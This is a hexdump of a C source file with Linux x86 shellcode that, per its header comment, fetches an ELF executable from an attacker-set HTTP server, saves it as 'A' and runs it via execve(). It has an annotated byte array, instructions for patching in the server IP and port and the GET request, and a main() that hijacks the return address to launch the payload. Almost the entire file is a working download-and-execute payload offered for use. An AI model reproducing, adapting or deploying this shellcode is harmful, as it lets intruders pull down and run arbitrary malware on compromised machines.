00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 2d 20 48 54 54  50 2f 31 2e 78 20 47 45  |6) - HTTP/1.x GE|
00000020  54 2c 20 44 6f 77 6e 6c  6f 61 64 73 20 61 6e 64  |T, Downloads and|
00000030  20 65 78 65 63 76 65 28  29 20 2d 20 31 31 31 20  | execve() - 111 |
00000040  62 79 74 65 73 2b 0d 0a  20 2a 0d 0a 20 2a 20 54  |bytes+.. *.. * T|
00000050  68 69 73 20 73 68 65 6c  6c 63 6f 64 65 20 61 6c  |his shellcode al|
00000060  6c 6f 77 73 20 79 6f 75  20 74 6f 20 64 6f 77 6e  |lows you to down|
00000070  6c 6f 61 64 20 61 20 45  4c 46 20 65 78 65 63 75  |load a ELF execu|
00000080  74 61 62 6c 65 20 73 74  72 61 69 67 68 74 20 6f  |table straight o|
00000090  66 66 20 61 20 73 74 61  6e 64 61 72 64 20 48 54  |ff a standard HT|
000000a0  54 50 20 73 65 72 76 65  72 0d 0a 20 2a 20 61 6e  |TP server.. * an|
000000b0  64 20 6c 61 75 6e 63 68  20 69 74 2e 20 49 74 20  |d launch it. It |
000000c0  77 69 6c 6c 20 73 61 76  65 64 20 6c 6f 63 61 6c  |will saved local|
000000d0  6c 79 20 69 74 20 69 6e  74 6f 20 61 20 66 69 6c  |ly it into a fil|
000000e0  65 6e 61 6d 65 20 63 61  6c 6c 65 64 20 27 41 27  |ename called 'A'|
000000f0  20 69 6e 20 74 68 65 20  63 75 72 72 65 6e 74 20  | in the current |
00000100  64 69 72 65 63 74 6f 72  79 2e 0d 0a 20 2a 20 0d  |directory... * .|
00000110  0a 20 2a 20 3c 5f 43 4f  4e 46 49 47 55 52 41 54  |. * <_CONFIGURAT|
00000120  49 4f 4e 3e 0d 0a 20 2a  0d 0a 20 2a 20 3e 20 54  |ION>.. *.. * > T|
00000130  68 65 20 64 65 73 74 69  6e 61 74 69 6f 6e 20 49  |he destination I|
00000140  50 20 6f 66 20 74 68 65  20 48 54 54 50 20 73 65  |P of the HTTP se|
00000150  72 76 65 72 20 69 73 20  72 65 71 75 69 72 65 64  |rver is required|
00000160  20 28 4e 4f 20 44 4e 53  21 29 2c 20 75 73 65 20  | (NO DNS!), use |
00000170  69 6e 65 74 5f 61 64 64  72 28 29 20 66 75 6e 63  |inet_addr() func|
00000180  74 69 6f 6e 20 72 65 73  75 6c 74 20 61 6e 64 20  |tion result and |
00000190  0d 0a 20 2a 20 20 20 6d  6f 64 69 66 79 20 74 68  |.. *   modify th|
000001a0  65 20 76 61 6c 75 65 20  69 6e 20 5b 31 2a 5d 20  |e value in [1*] |
000001b0  66 72 6f 6d 20 30 78 64  65 61 64 62 65 65 66 20  |from 0xdeadbeef |
000001c0  74 6f 20 74 68 65 20 61  63 74 75 61 6c 20 49 50  |to the actual IP|
000001d0  2c 20 69 66 20 74 68 65  20 49 50 20 63 6f 6e 74  |, if the IP cont|
000001e0  61 69 6e 73 20 4e 55 4c  4c 73 20 74 68 65 6e 20  |ains NULLs then |
000001f0  61 20 6c 69 74 74 6c 65  20 0d 0a 20 2a 20 20 20  |a little .. *   |
00000200  77 6f 72 6b 61 72 6f 75  6e 64 20 72 65 71 75 69  |workaround requi|
00000210  72 65 73 2e 20 54 68 65  20 73 69 6d 70 6c 65 73  |res. The simples|
00000220  74 20 69 73 20 74 6f 20  75 73 65 20 7e 69 6e 65  |t is to use ~ine|
00000230  74 5f 61 64 64 72 28 29  20 66 6f 6c 6c 6f 77 65  |t_addr() followe|
00000240  64 20 62 79 20 60 60 6e  6f 74 6c 20 28 25 65 73  |d by ``notl (%es|
00000250  70 29 60 60 20 74 6f 20  63 68 61 6e 67 65 20 62  |p)`` to change b|
00000260  61 63 6b 2e 20 0d 0a 20  2a 0d 0a 20 2a 20 3e 20  |ack. .. *.. * > |
00000270  54 68 65 20 64 65 73 74  69 6e 61 74 69 6f 6e 20  |The destination |
00000280  70 6f 72 74 20 6f 66 20  74 68 65 20 48 54 54 50  |port of the HTTP|
00000290  20 73 65 72 76 65 72 20  69 73 20 38 30 20 62 79  | server is 80 by|
000002a0  20 64 65 66 61 75 6c 74  2c 20 69 74 20 69 73 20  | default, it is |
000002b0  6c 6f 63 61 74 65 64 20  77 69 74 68 69 6e 20 74  |located within t|
000002c0  68 65 20 34 20 75 70 70  65 72 20 62 79 74 65 73  |he 4 upper bytes|
000002d0  0d 0a 20 2a 20 20 20 6f  66 20 74 68 65 20 76 61  |.. *   of the va|
000002e0  6c 75 65 20 69 6e 20 5b  32 2a 5d 20 28 30 78 61  |lue in [2*] (0xa|
000002f0  66 66 66 29 2e 20 53 74  6f 72 65 64 20 69 6e 20  |fff). Stored in |
00000300  61 6e 20 69 6e 76 65 72  74 20 66 6f 72 6d 61 74  |an invert format|
00000310  20 28 7e 29 2c 20 73 6f  20 69 66 20 61 6e 79 20  | (~), so if any |
00000320  66 75 72 74 68 65 72 20  6d 6f 64 69 66 69 63 61  |further modifica|
00000330  74 69 6f 6e 20 0d 0a 20  2a 20 20 20 6e 65 65 64  |tion .. *   need|
00000340  65 64 20 6d 61 6b 65 20  73 75 72 65 20 74 6f 20  |ed make sure to |
00000350  6b 65 65 70 20 69 74 20  73 74 6f 72 65 64 20 69  |keep it stored i|
00000360  6e 20 74 68 65 20 73 61  6d 65 20 66 6f 72 6d 61  |n the same forma|
00000370  74 2e 0d 0a 20 2a 0d 0a  20 2a 20 3e 20 54 68 65  |t... *.. * > The|
00000380  20 64 65 73 74 69 6e 61  74 69 6f 6e 20 55 52 4c  | destination URL|
00000390  20 73 68 6f 75 6c 64 20  62 65 20 67 65 6e 65 72  | should be gener|
000003a0  61 74 65 64 20 75 73 69  6e 67 20 74 68 65 20 60  |ated using the `|
000003b0  60 67 65 6e 5f 68 74 74  70 72 65 71 60 60 20 75  |`gen_httpreq`` u|
000003c0  74 69 6c 69 74 79 2e 20  49 74 20 77 69 6c 6c 20  |tility. It will |
000003d0  70 72 6f 64 75 63 65 20  61 6e 0d 0a 20 2a 20 20  |produce an.. *  |
000003e0  20 61 73 73 65 6d 62 6c  79 20 63 6f 64 65 20 77  | assembly code w|
000003f0  68 69 63 68 20 69 73 20  61 20 73 65 72 69 65 73  |hich is a series|
00000400  20 6f 66 20 50 55 53 48  27 73 20 61 6e 64 20 73  | of PUSH's and s|
00000410  68 6f 75 6c 64 20 62 65  20 70 61 73 74 65 64 20  |hould be pasted |
00000420  61 73 20 69 74 20 69 73  20 77 69 74 68 69 6e 20  |as it is within |
00000430  69 6e 20 74 68 65 20 6d  61 72 6b 65 64 20 70 6c  |in the marked pl|
00000440  61 63 65 0d 0a 20 2a 20  20 20 69 6e 20 74 68 65  |ace.. *   in the|
00000450  20 73 68 65 6c 6c 63 6f  64 65 20 28 6c 6f 6f 6b  | shellcode (look|
00000460  20 66 6f 72 20 74 68 65  20 63 6f 6d 6d 65 6e 74  | for the comment|
00000470  29 2e 0d 0a 20 2a 20 0d  0a 20 2a 20 3c 5f 4c 49  |)... * .. * <_LI|
00000480  4e 4b 53 2f 55 54 49 4c  49 54 49 45 53 3e 3a 0d  |NKS/UTILITIES>:.|
00000490  0a 20 2a 0d 0a 20 2a 20  20 20 20 20 20 67 65 6e  |. *.. *      gen|
000004a0  5f 68 74 74 70 72 65 71  2e 63 2c 20 67 65 6e 65  |_httpreq.c, gene|
000004b0  72 61 74 65 73 20 61 20  48 54 54 50 20 47 45 54  |rates a HTTP GET|
000004c0  20 72 65 71 75 65 73 74  20 66 6f 72 20 74 68 69  | request for thi|
000004d0  73 20 73 68 65 6c 6c 63  6f 64 65 0d 0a 20 2a 20  |s shellcode.. * |
000004e0  20 20 20 20 20 3e 20 68  74 74 70 3a 2f 2f 77 77  |     > http://ww|
000004f0  77 2e 74 74 79 36 34 2e  6f 72 67 2f 63 6f 64 65  |w.tty64.org/code|
00000500  2f 73 68 65 6c 6c 63 6f  64 65 73 2f 75 74 69 6c  |/shellcodes/util|
00000510  69 74 69 65 73 2f 67 65  6e 5f 68 74 74 70 72 65  |ities/gen_httpre|
00000520  71 2e 63 0d 0a 20 2a 09  62 61 63 6b 75 70 0d 0a  |q.c.. *.backup..|
00000530  20 2a 09 3e 20 68 74 74  70 3a 2f 2f 77 77 77 2e  | *.> http://www.|
00000540  6d 69 6c 77 30 72 6d 2e  63 6f 6d 2f 73 68 65 6c  |milw0rm.com/shel|
00000550  6c 63 6f 64 65 2f 32 36  31 38 0d 0a 20 2a 0d 0a  |lcode/2618.. *..|
00000560  20 2a 20 2d 20 69 7a 69  6b 20 3c 20 69 7a 69 6b  | * - izik < izik|
00000570  40 74 74 79 36 34 2e 6f  72 67 20 3e 0d 0a 20 2a  |@tty64.org >.. *|
00000580  2f 0d 0a 0d 0a 63 68 61  72 20 73 68 65 6c 6c 63  |/....char shellc|
00000590  6f 64 65 5b 5d 20 3d 20  0d 0a 0d 0a 09 22 5c 78  |ode[] = ....."\x|
000005a0  36 61 5c 78 36 36 22 20  20 20 20 20 20 20 20 20  |6a\x66"         |
000005b0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |     // push $0x|
000005c0  36 36 20 0d 0a 09 22 5c  78 35 38 22 20 20 20 20  |66 ..."\x58"    |
000005d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000005e0  20 70 6f 70 20 25 65 61  78 20 0d 0a 09 22 5c 78  | pop %eax ..."\x|
000005f0  39 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |99"             |
00000600  20 20 20 20 20 2f 2f 20  63 6c 74 64 20 0d 0a 09  |     // cltd ...|
00000610  22 5c 78 36 61 5c 78 30  31 22 20 20 20 20 20 20  |"\x6a\x01"      |
00000620  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000630  24 30 78 31 20 0d 0a 09  22 5c 78 35 62 22 20 20  |$0x1 ..."\x5b"  |
00000640  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000650  2f 2f 20 70 6f 70 20 25  65 62 78 20 0d 0a 09 22  |// pop %ebx ..."|
00000660  5c 78 35 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x52"           |
00000670  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000680  65 64 78 20 0d 0a 09 22  5c 78 35 33 22 20 20 20  |edx ..."\x53"   |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000006a0  2f 20 70 75 73 68 20 25  65 62 78 20 0d 0a 09 22  |/ push %ebx ..."|
000006b0  5c 78 36 61 5c 78 30 32  22 20 20 20 20 20 20 20  |\x6a\x02"       |
000006c0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 24  |       // push $|
000006d0  30 78 32 20 0d 0a 09 22  5c 78 38 39 5c 78 65 31  |0x2 ..."\x89\xe1|
000006e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
000006f0  2f 20 6d 6f 76 20 25 65  73 70 2c 25 65 63 78 20  |/ mov %esp,%ecx |
00000700  0d 0a 09 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |..."\xcd\x80"   |
00000710  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000720  74 20 24 30 78 38 30 20  0d 0a 09 22 5c 78 35 62  |t $0x80 ..."\x5b|
00000730  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000740  20 20 20 2f 2f 20 70 6f  70 20 25 65 62 78 20 0d  |   // pop %ebx .|
00000750  0a 09 22 5c 78 35 65 22  20 20 20 20 20 20 20 20  |.."\x5e"        |
00000760  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 6f 70  |          // pop|
00000770  20 25 65 73 69 20 0d 0a  09 22 5c 78 36 38 5c 78  | %esi ..."\x68\x|
00000780  65 66 5c 78 62 65 5c 78  61 64 5c 78 64 65 22 20  |ef\xbe\xad\xde" |
00000790  20 2f 2f 20 5b 31 2a 5d  20 70 75 73 68 20 24 30  | // [1*] push $0|
000007a0  78 64 65 61 64 62 65 65  66 0d 0a 09 22 5c 78 62  |xdeadbeef..."\xb|
000007b0  64 5c 78 66 64 5c 78 66  66 5c 78 66 66 5c 78 61  |d\xfd\xff\xff\xa|
000007c0  66 22 20 20 2f 2f 20 5b  32 2a 5d 20 6d 6f 76 20  |f"  // [2*] mov |
000007d0  24 30 78 61 66 66 66 66  66 66 64 2c 25 65 62 70  |$0xaffffffd,%ebp|
000007e0  20 0d 0a 09 22 5c 78 66  37 5c 78 64 35 22 20 20  | ..."\xf7\xd5"  |
000007f0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6e  |            // n|
00000800  6f 74 20 25 65 62 70 20  0d 0a 09 22 5c 78 35 35  |ot %ebp ..."\x55|
00000810  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000820  20 20 20 2f 2f 20 70 75  73 68 20 25 65 62 70 20  |   // push %ebp |
00000830  0d 0a 09 22 5c 78 34 33  22 20 20 20 20 20 20 20  |..."\x43"       |
00000840  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000850  63 20 25 65 62 78 20 0d  0a 09 22 5c 78 36 61 5c  |c %ebx ..."\x6a\|
00000860  78 31 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x10"            |
00000870  20 20 2f 2f 20 70 75 73  68 20 24 30 78 31 30 20  |  // push $0x10 |
00000880  0d 0a 09 22 5c 78 35 31  22 20 20 20 20 20 20 20  |..."\x51"       |
00000890  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
000008a0  73 68 20 25 65 63 78 20  0d 0a 09 22 5c 78 35 30  |sh %ecx ..."\x50|
000008b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000008c0  20 20 20 2f 2f 20 70 75  73 68 20 25 65 61 78 20  |   // push %eax |
000008d0  0d 0a 09 22 5c 78 62 30  5c 78 36 36 22 20 20 20  |..."\xb0\x66"   |
000008e0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
000008f0  76 20 24 30 78 36 36 2c  25 61 6c 20 0d 0a 09 22  |v $0x66,%al ..."|
00000900  5c 78 38 39 5c 78 65 31  22 20 20 20 20 20 20 20  |\x89\xe1"       |
00000910  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 25 65  |       // mov %e|
00000920  73 70 2c 25 65 63 78 20  0d 0a 09 22 5c 78 63 64  |sp,%ecx ..."\xcd|
00000930  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000940  20 20 20 2f 2f 20 69 6e  74 20 24 30 78 38 30 20  |   // int $0x80 |
00000950  0d 0a 09 22 5c 78 35 66  22 20 20 20 20 20 20 20  |..."\x5f"       |
00000960  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 6f  |           // po|
00000970  70 20 25 65 64 69 20 0d  0a 09 22 5c 78 62 30 5c  |p %edi ..."\xb0\|
00000980  78 30 38 22 20 20 20 20  20 20 20 20 20 20 20 20  |x08"            |
00000990  20 20 2f 2f 20 6d 6f 76  20 24 30 78 38 2c 25 61  |  // mov $0x8,%a|
000009a0  6c 20 0d 0a 09 22 5c 78  35 32 22 20 20 20 20 20  |l ..."\x52"     |
000009b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000009c0  70 75 73 68 20 25 65 64  78 20 0d 0a 09 22 5c 78  |push %edx ..."\x|
000009d0  36 61 5c 78 34 31 22 20  20 20 20 20 20 20 20 20  |6a\x41"         |
000009e0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |     // push $0x|
000009f0  34 31 20 0d 0a 09 22 5c  78 38 39 5c 78 65 33 22  |41 ..."\x89\xe3"|
00000a00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000a10  20 6d 6f 76 20 25 65 73  70 2c 25 65 62 78 20 0d  | mov %esp,%ebx .|
00000a20  0a 09 22 5c 78 35 30 22  20 20 20 20 20 20 20 20  |.."\x50"        |
00000a30  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000a40  68 20 25 65 61 78 20 0d  0a 09 22 5c 78 35 39 22  |h %eax ..."\x59"|
00000a50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a60  20 20 2f 2f 20 70 6f 70  20 25 65 63 78 20 0d 0a  |  // pop %ecx ..|
00000a70  09 22 5c 78 63 64 5c 78  38 30 22 20 20 20 20 20  |."\xcd\x80"     |
00000a80  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00000a90  24 30 78 38 30 20 0d 0a  09 22 5c 78 39 36 22 20  |$0x80 ..."\x96" |
00000aa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ab0  20 2f 2f 20 78 63 68 67  20 25 65 61 78 2c 25 65  | // xchg %eax,%e|
00000ac0  73 69 20 0d 0a 09 22 5c  78 38 37 5c 78 64 66 22  |si ..."\x87\xdf"|
00000ad0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000ae0  20 78 63 68 67 20 25 65  62 78 2c 25 65 64 69 20  | xchg %ebx,%edi |
00000af0  0d 0a 0d 0a 09 2f 2f 0d  0a 09 2f 2f 20 3c 5f 70  |.....//...// <_p|
00000b00  61 73 74 65 20 68 65 72  65 20 74 68 65 20 63 6f  |aste here the co|
00000b10  64 65 2c 20 74 68 61 74  20 67 65 6e 5f 68 74 74  |de, that gen_htt|
00000b20  70 72 65 71 2e 63 20 6f  75 74 70 75 74 73 21 3e  |preq.c outputs!>|
00000b30  0d 0a 09 2f 2f 0d 0a 0d  0a 09 22 5c 78 62 30 5c  |...//....."\xb0\|
00000b40  78 30 34 22 20 20 20 20  20 20 20 20 20 20 20 20  |x04"            |
00000b50  20 20 2f 2f 20 6d 6f 76  20 24 30 78 34 2c 25 61  |  // mov $0x4,%a|
00000b60  6c 20 0d 0a 0d 0a 09 2f  2f 0d 0a 09 2f 2f 20 3c  |l .....//...// <|
00000b70  5f 73 65 6e 64 5f 68 74  74 70 5f 72 65 71 75 65  |_send_http_reque|
00000b80  73 74 3e 3a 0d 0a 09 2f  2f 0d 0a 0d 0a 09 22 5c  |st>:...//....."\|
00000b90  78 38 39 5c 78 65 31 22  20 20 20 20 20 20 20 20  |x89\xe1"        |
00000ba0  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 25 65 73  |      // mov %es|
00000bb0  70 2c 25 65 63 78 20 0d  0a 09 22 5c 78 63 64 5c  |p,%ecx ..."\xcd\|
00000bc0  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000bd0  20 20 2f 2f 20 69 6e 74  20 24 30 78 38 30 20 0d  |  // int $0x80 .|
00000be0  0a 09 22 5c 78 39 39 22  20 20 20 20 20 20 20 20  |.."\x99"        |
00000bf0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 63 6c 74  |          // clt|
00000c00  64 20 0d 0a 09 22 5c 78  34 32 22 20 20 20 20 20  |d ..."\x42"     |
00000c10  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000c20  69 6e 63 20 25 65 64 78  20 0d 0a 0d 0a 09 2f 2f  |inc %edx .....//|
00000c30  0d 0a 09 2f 2f 20 3c 5f  77 61 69 74 5f 66 6f 72  |...// <_wait_for|
00000c40  5f 64 62 6c 5f 63 72 6c  66 3e 3a 0d 0a 09 2f 2f  |_dbl_crlf>:...//|
00000c50  0d 0a 0d 0a 09 22 5c 78  34 39 22 20 20 20 20 20  |....."\x49"     |
00000c60  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000c70  64 65 63 20 25 65 63 78  20 0d 0a 09 22 5c 78 62  |dec %ecx ..."\xb|
00000c80  30 5c 78 30 33 22 20 20  20 20 20 20 20 20 20 20  |0\x03"          |
00000c90  20 20 20 20 2f 2f 20 6d  6f 76 20 24 30 78 33 2c  |    // mov $0x3,|
00000ca0  25 61 6c 20 0d 0a 09 22  5c 78 63 64 5c 78 38 30  |%al ..."\xcd\x80|
00000cb0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000cc0  2f 20 69 6e 74 20 24 30  78 38 30 20 0d 0a 09 22  |/ int $0x80 ..."|
00000cd0  5c 78 38 31 5c 78 33 39  5c 78 30 61 5c 78 30 64  |\x81\x39\x0a\x0d|
00000ce0  5c 78 30 61 5c 78 30 64  22 20 2f 2f 20 63 6d 70  |\x0a\x0d" // cmp|
00000cf0  6c 20 24 30 78 64 30 61  30 64 30 61 2c 28 25 65  |l $0xd0a0d0a,(%e|
00000d00  63 78 29 20 0d 0a 09 22  5c 78 37 35 5c 78 66 33  |cx) ..."\x75\xf3|
00000d10  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000d20  2f 20 6a 6e 65 20 3c 5f  77 61 69 74 5f 66 6f 72  |/ jne <_wait_for|
00000d30  5f 64 62 6c 5f 63 72 6c  66 3e 20 0d 0a 09 22 5c  |_dbl_crlf> ..."\|
00000d40  78 62 32 5c 78 30 34 22  20 20 20 20 20 20 20 20  |xb2\x04"        |
00000d50  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 24 30 78  |      // mov $0x|
00000d60  34 2c 25 64 6c 20 0d 0a  0d 0a 09 2f 2f 0d 0a 09  |4,%dl .....//...|
00000d70  2f 2f 20 3c 5f 64 75 6d  70 5f 6c 6f 6f 70 5f 64  |// <_dump_loop_d|
00000d80  6f 5f 72 65 61 64 3e 3a  0d 0a 09 2f 2f 0d 0a 0d  |o_read>:...//...|
00000d90  0a 09 22 5c 78 62 30 5c  78 30 33 22 20 20 20 20  |.."\xb0\x03"    |
00000da0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000db0  20 24 30 78 33 2c 25 61  6c 20 0d 0a 09 22 5c 78  | $0x3,%al ..."\x|
00000dc0  66 38 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |f8"             |
00000dd0  20 20 20 20 20 2f 2f 20  63 6c 63 20 0d 0a 0d 0a  |     // clc ....|
00000de0  0d 0a 09 2f 2f 0d 0a 09  2f 2f 20 3c 5f 64 75 6d  |...//...// <_dum|
00000df0  70 5f 6c 6f 6f 70 5f 64  6f 5f 77 72 69 74 65 3e  |p_loop_do_write>|
00000e00  3a 0d 0a 09 2f 2f 0d 0a  0d 0a 09 22 5c 78 63 64  |:...//....."\xcd|
00000e10  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000e20  20 20 20 2f 2f 20 69 6e  74 20 24 30 78 38 30 20  |   // int $0x80 |
00000e30  0d 0a 09 22 5c 78 38 37  5c 78 64 65 22 20 20 20  |..."\x87\xde"   |
00000e40  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 78 63  |           // xc|
00000e50  68 67 20 25 65 62 78 2c  25 65 73 69 20 0d 0a 09  |hg %ebx,%esi ...|
00000e60  22 5c 78 37 32 5c 78 66  37 22 20 20 20 20 20 20  |"\x72\xf7"      |
00000e70  20 20 20 20 20 20 20 20  2f 2f 20 6a 62 20 3c 5f  |        // jb <_|
00000e80  64 75 6d 70 5f 6c 6f 6f  70 5f 64 6f 5f 72 65 61  |dump_loop_do_rea|
00000e90  64 3e 20 0d 0a 09 22 5c  78 38 35 5c 78 63 30 22  |d> ..."\x85\xc0"|
00000ea0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000eb0  20 74 65 73 74 20 25 65  61 78 2c 25 65 61 78 20  | test %eax,%eax |
00000ec0  0d 0a 09 22 5c 78 37 34  5c 78 30 35 22 20 20 20  |..."\x74\x05"   |
00000ed0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6a 65  |           // je|
00000ee0  20 3c 5f 63 6c 6f 73 65  5f 66 69 6c 65 3e 20 0d  | <_close_file> .|
00000ef0  0a 09 22 5c 78 62 30 5c  78 30 34 22 20 20 20 20  |.."\xb0\x04"    |
00000f00  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000f10  20 24 30 78 34 2c 25 61  6c 20 0d 0a 09 22 5c 78  | $0x4,%al ..."\x|
00000f20  66 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |f9"             |
00000f30  20 20 20 20 20 2f 2f 20  73 74 63 20 0d 0a 09 22  |     // stc ..."|
00000f40  5c 78 65 62 5c 78 66 31  22 20 20 20 20 20 20 20  |\xeb\xf1"       |
00000f50  20 20 20 20 20 20 20 2f  2f 20 6a 6d 70 20 3c 5f  |       // jmp <_|
00000f60  64 75 6d 70 5f 6c 6f 6f  70 5f 64 6f 5f 77 72 69  |dump_loop_do_wri|
00000f70  74 65 3e 20 0d 0a 09 22  5c 78 62 30 5c 78 30 36  |te> ..."\xb0\x06|
00000f80  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000f90  2f 20 6d 6f 76 20 24 30  78 36 2c 25 61 6c 20 0d  |/ mov $0x6,%al .|
00000fa0  0a 09 22 5c 78 63 64 5c  78 38 30 22 20 20 20 20  |.."\xcd\x80"    |
00000fb0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 69 6e 74  |          // int|
00000fc0  20 24 30 78 38 30 20 0d  0a 09 22 5c 78 39 39 22  | $0x80 ..."\x99"|
00000fd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000fe0  20 20 2f 2f 20 63 6c 74  64 20 0d 0a 09 22 5c 78  |  // cltd ..."\x|
00000ff0  62 30 5c 78 30 62 22 20  20 20 20 20 20 20 20 20  |b0\x0b"         |
00001000  20 20 20 20 20 2f 2f 20  6d 6f 76 20 24 30 78 62  |     // mov $0xb|
00001010  2c 25 61 6c 20 0d 0a 09  22 5c 78 38 39 5c 78 66  |,%al ..."\x89\xf|
00001020  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
00001030  2f 2f 20 6d 6f 76 20 25  65 64 69 2c 25 65 62 78  |// mov %edi,%ebx|
00001040  20 0d 0a 09 22 5c 78 35  32 22 20 20 20 20 20 20  | ..."\x52"      |
00001050  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00001060  75 73 68 20 25 65 64 78  20 0d 0a 09 22 5c 78 35  |ush %edx ..."\x5|
00001070  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3"              |
00001080  20 20 20 20 2f 2f 20 70  75 73 68 20 25 65 62 78  |    // push %ebx|
00001090  20 0d 0a 09 22 5c 78 65  62 5c 78 63 63 22 3b 20  | ..."\xeb\xcc"; |
000010a0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6a  |            // j|
000010b0  6d 70 20 3c 5f 73 65 6e  64 5f 68 74 74 70 5f 72  |mp <_send_http_r|
000010c0  65 71 75 65 73 74 3e 20  0d 0a 0d 0a 69 6e 74 20  |equest> ....int |
000010d0  6d 61 69 6e 28 69 6e 74  20 61 72 67 63 2c 20 63  |main(int argc, c|
000010e0  68 61 72 20 2a 2a 61 72  67 76 29 20 7b 0d 0a 09  |har **argv) {...|
000010f0  69 6e 74 20 2a 72 65 74  3b 0d 0a 09 72 65 74 20  |int *ret;...ret |
00001100  3d 20 28 69 6e 74 20 2a  29 26 72 65 74 20 2b 20  |= (int *)&ret + |
00001110  32 3b 0d 0a 09 28 2a 72  65 74 29 20 3d 20 28 69  |2;...(*ret) = (i|
00001120  6e 74 29 20 73 68 65 6c  6c 63 6f 64 65 3b 0d 0a  |nt) shellcode;..|
00001130  7d                                                |}|
00001131
